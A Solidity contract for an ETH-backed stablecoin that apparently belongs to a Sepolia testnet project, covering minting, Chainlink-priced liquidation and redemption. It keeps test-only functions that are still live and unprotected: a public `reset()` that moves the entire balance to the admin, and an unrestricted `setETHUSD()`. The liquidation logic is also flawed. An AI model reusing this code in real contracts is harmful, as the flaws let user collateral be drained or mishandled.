// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.20;

import {AggregatorV3Interface} from "@chainlink/contracts@1.1.0/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import "@openzeppelin/contracts@5.0.2/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts@5.0.2/access/Ownable.sol";
import "@openzeppelin/contracts@5.0.2/token/ERC20/extensions/ERC20Permit.sol";

/**
 * @title  Crypto-Collateralized(i.e. eth) Stablecoin contract
 * @author Dreamboys
 * @notice You can use this contract for only `Sepolia` network because of `datafeed`.
 * @dev You MUST register chainlink automation after deploying contract, `https://automation.chain.link/mainnet`.
 *      You MUST set the trigger as `Time-based` and set target function `autoEthLiqudate`.
 *      It is recommended to set the scheduler time to no less than 10 minutes
 *      due to the volatility of eth prices.
 */
contract RMAStablecoin is ERC20, Ownable, ERC20Permit {
    /**
     * @dev These values can be adjusted through governance.
     * @notice Collateralization Parameters
     */
    uint256 public minimumCollateralizationRatio;
    uint256 public liquidation_ratio;
    uint256 public liqudateFeePercent;

    /// Mappings
    mapping(address => uint256) ethLiqudationPrice;
    mapping(address => uint256) userCollateralWei;
    mapping(address => uint256) mintedStablecoins;

    /// Addresses
    address public rmaAdmin;
    address[] participantAddresses;

    /// lateset ETH/USD price
    uint256 public ETHUSD;

    /// Chainlink Data Feed Interface
    AggregatorV3Interface internal dataFeed;

    /// Events
    event CollateralRedeemed(
        address indexed user,
        uint256 collateralAmount,
        uint256 burnedAmount,
        string message
    );
    event CollateralLiquidated(
        address indexed user,
        uint256 refundWeiAmount,
        string message
    );

    constructor(
        address initialOwner,
        uint256 _ETHUSD,
        uint256 _minimumCollateralizationRatio,
        uint256 _liquidation_ratio,
        uint256 _liqudateFeePercent
    )
        payable
        ERC20("RMAStableCoin", "USDR")
        Ownable(initialOwner)
        ERC20Permit("RMAStableCoin")
    {
        dataFeed = AggregatorV3Interface(
            0x694AA1769357215DE4FAC081bf1f309aDC325306
        );

        ETHUSD = _ETHUSD;
        minimumCollateralizationRatio = _minimumCollateralizationRatio;
        liquidation_ratio = _liquidation_ratio;
        liqudateFeePercent = _liqudateFeePercent;
        rmaAdmin = msg.sender;
    }

    function mintByEth() public payable returns (uint256) {
        // 사전 검증
        require(
            msg.value > 0,
            "StableCoin: you have to send ETH to swap Stable Coin"
        );

        // 청산가, 스테이블 코인 발행량 계산
        uint256 weiAmount = msg.value;
        // 3126 x wei / 1e18
        uint256 latestETHUSD = uint256(getLatestETHUSD());
        ETHUSD = latestETHUSD;
        uint256 truncateETHUSD = truncateETHUSDDecimals(ETHUSD);
        uint256 amountToMint = (((weiAmount * truncateETHUSD) / 1e18) * 100) /
            minimumCollateralizationRatio;
        uint256 liqudatePrice = (truncateETHUSD * 100) / liquidation_ratio;

        // 만약 이미 발행했었다면, 청산가 다시 계산
        if (userCollateralWei[msg.sender] > 0) {
            uint256 collateral = userCollateralWei[msg.sender];
            // uint256 nowETHUSD = ETHUSD;
            // // 기존 1 이더, 새로운 2이더
            // // 그때 청산가 2000, 현재 3000
            // // 청산가 = (1 x 2000) + (2 x 6000) / 1+2 = 2666
            liqudatePrice =
                ((collateral * ethLiqudationPrice[msg.sender]) +
                    (weiAmount * liqudatePrice)) /
                (collateral + weiAmount);
        }

        // 저장 : 발행인 등록, 청산가, 담보 액수, 달러 발행 액수
        participantAddresses.push(msg.sender);
        ethLiqudationPrice[msg.sender] = liqudatePrice;
        userCollateralWei[msg.sender] += msg.value;
        mintedStablecoins[msg.sender] += amountToMint;

        // 유저에게 토큰 발행 로직
        _mint(msg.sender, amountToMint);

        return liqudatePrice;
    }

    function autoEthLiqudate() public payable {
        // `getLatestETHUSD()` and Truncate the decimals
        uint256 latestETHUSD = truncateETHUSDDecimals(
            uint256(getLatestETHUSD())
        );

        // Iterate over users who have participated
        // (who have Deposit Collateral and Issued Stablecoins)
        for (uint256 i = 0; i < participantAddresses.length; i++) {
            // If `ethLiqudationPrice` of user is higher than `latestETHUSD`,
            // Liquidation begins.
            if (ethLiqudationPrice[participantAddresses[i]] > latestETHUSD) {
                address payable user = payable(participantAddresses[i]);

                uint256 currentCollateralPrice = (userCollateralWei[user] *
                    latestETHUSD) / 1e18;

                uint256 liquidatationFee = (currentCollateralPrice *
                    liqudateFeePercent) / 100;

                uint256 refundAmountDollar = currentCollateralPrice -
                    mintedStablecoins[user] -
                    liquidatationFee;

                uint256 netRefundAmoutWei = (refundAmountDollar * 1 ether) /
                    latestETHUSD;

                // Transfer refundAmountWei to User
                user.transfer(netRefundAmoutWei);

                // Clear all data
                ethLiqudationPrice[user] = 0;
                userCollateralWei[user] = 0;

                // Emit Event {CollateralLiquidated}
                emit CollateralLiquidated(
                    user,
                    netRefundAmoutWei,
                    "Your Collateral is liqudated and Transferred net refund"
                );
            }
        }
    }

    // External or Public Functions

    function redeemCollateralAndBurn() public payable returns (bool) {
        address payable user = payable(msg.sender);

        require(
            userCollateralWei[user] > 0,
            "Stable Coin : No Collateral available to redeem."
        );

        uint256 valutAmount = userCollateralWei[user];

        // Redeem Collateral ETH to User
        user.transfer(valutAmount);

        // Burn all Stable coins User minted
        _burn(msg.sender, mintedStablecoins[user]);

        // Reset All data
        userCollateralWei[user] = 0;
        ethLiqudationPrice[user] = 0;
        mintedStablecoins[user] = 0;

        // Emit Event {CollateralRedeemed}
        emit CollateralRedeemed(
            user,
            valutAmount,
            mintedStablecoins[user],
            "Collateral Redeemed and Stablecoin Burned"
        );

        return true;
    }

    function setLiquadation_ratio(
        uint256 _liquidation_ratio
    ) external onlyOwner returns (bool) {
        liquidation_ratio = _liquidation_ratio;
        return true;
    }

    function setLiqudationFeePercent(
        uint256 _liqudateFeePercent
    ) external onlyOwner returns (bool) {
        liqudateFeePercent = _liqudateFeePercent;
        return true;
    }

    function setMinimumCollateralizationRatio(
        uint256 _minimumCollateralizationRatio
    ) external onlyOwner returns (bool) {
        minimumCollateralizationRatio = _minimumCollateralizationRatio;
        return true;
    }

    // To Be Deleted... For Test Only
    function setETHUSD(uint256 _ETHUSD) public returns (uint256) {
        ETHUSD = _ETHUSD;
        return ETHUSD;
    }

    receive() external payable {}

    fallback() external payable {}

    // Internal or Private Functions

    // View or Pure Functions

    function truncateETHUSDDecimals(
        uint256 ethUsd
    ) public pure returns (uint256) {
        return ethUsd / 1e8;
    }

    function getLatestETHUSD() public view returns (int) {
        (
            ,
            /* uint80 roundID */ int answer,
            ,
            ,

        ) = /*uint startedAt*/ /*uint timeStamp*/ /*uint80 answeredInRound*/
            dataFeed.latestRoundData();

        return answer;
    }

    function getTotalCollateralBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getCollateralBalance() public view returns (uint256) {
        return userCollateralWei[msg.sender];
    }

    function getEthLiquidationPrice() public view returns (uint256) {
        return ethLiqudationPrice[msg.sender];
    }

    function getStablecoinBalance() public view returns (uint256) {
        return mintedStablecoins[msg.sender];
    }

    // To be Deleted.... For testOnly
    function reset() public payable returns (bool) {
        address payable tothe = payable(rmaAdmin);
        uint256 total = address(this).balance;
        tothe.transfer(total);
        return true;
    }
}
